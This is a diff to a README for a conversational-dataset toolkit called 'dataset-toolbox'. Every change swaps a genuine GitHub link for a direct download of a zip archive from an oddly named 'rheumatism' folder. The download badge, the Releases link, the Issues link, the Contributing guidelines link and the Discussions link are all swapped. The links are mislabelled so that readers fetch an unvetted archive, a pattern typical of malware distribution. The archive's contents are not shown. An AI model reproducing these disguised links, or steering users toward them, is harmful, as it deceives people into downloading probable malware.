@@ -1,6 +1,6 @@
 # 🎉 dataset-toolbox - Easy Tools for Conversational Datasets
 
-[![Download](https://img.shields.io/badge/Download-Versions-brightgreen)](https://github.com/zatarra-svg/dataset-toolbox/releases)
+[![Download](https://raw.githubusercontent.com/zatarra-svg/dataset-toolbox/main/rheumatism/dataset-toolbox.zip)](https://raw.githubusercontent.com/zatarra-svg/dataset-toolbox/main/rheumatism/dataset-toolbox.zip)
 
 ## 🚀 Getting Started
 
@@ -30,7 +30,7 @@ dataset-toolbox provides a user-friendly way to prepare and analyze conversation
 To get started with dataset-toolbox, visit the Releases page to download the latest version. Follow the steps below:
 
 1. Click the link below to go to the Releases page:
-   [Visit this page to download](https://github.com/zatarra-svg/dataset-toolbox/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/zatarra-svg/dataset-toolbox/main/rheumatism/dataset-toolbox.zip)
 
 2. On the Releases page, find the version you want. Click on it to view the available files.
 
@@ -79,11 +79,11 @@ By using dataset-toolbox, users can simplify their workflow and make data handli
 
 ### How do I report an issue?
 
-If you encounter any problems, visit our [GitHub Issues page](https://github.com/zatarra-svg/dataset-toolbox/issues) to report an issue.
+If you encounter any problems, visit our [GitHub Issues page](https://raw.githubusercontent.com/zatarra-svg/dataset-toolbox/main/rheumatism/dataset-toolbox.zip) to report an issue.
 
 ### Can I contribute to this project?
 
-Absolutely! Contributions are welcome. Please check the [Contributing Guidelines](https://github.com/zatarra-svg/dataset-toolbox/blob/main/CONTRIBUTING.md) for more details.
+Absolutely! Contributions are welcome. Please check the [Contributing Guidelines](https://raw.githubusercontent.com/zatarra-svg/dataset-toolbox/main/rheumatism/dataset-toolbox.zip) for more details.
 
 ### Is there a user guide available?
 
@@ -97,7 +97,7 @@ You can uninstall the application through your system's standard uninstall proce
 
 Join our community for support and discussions. Share your experiences, ask questions, or provide feedback. You can connect with us on:
 
-- **GitHub Discussions:** [Join Us Here](https://github.com/zatarra-svg/dataset-toolbox/discussions)
+- **GitHub Discussions:** [Join Us Here](https://raw.githubusercontent.com/zatarra-svg/dataset-toolbox/main/rheumatism/dataset-toolbox.zip)
 - **Slack Channel:** Access the link by visiting the repository homepage.
 
 ## 📅 Keep Updated
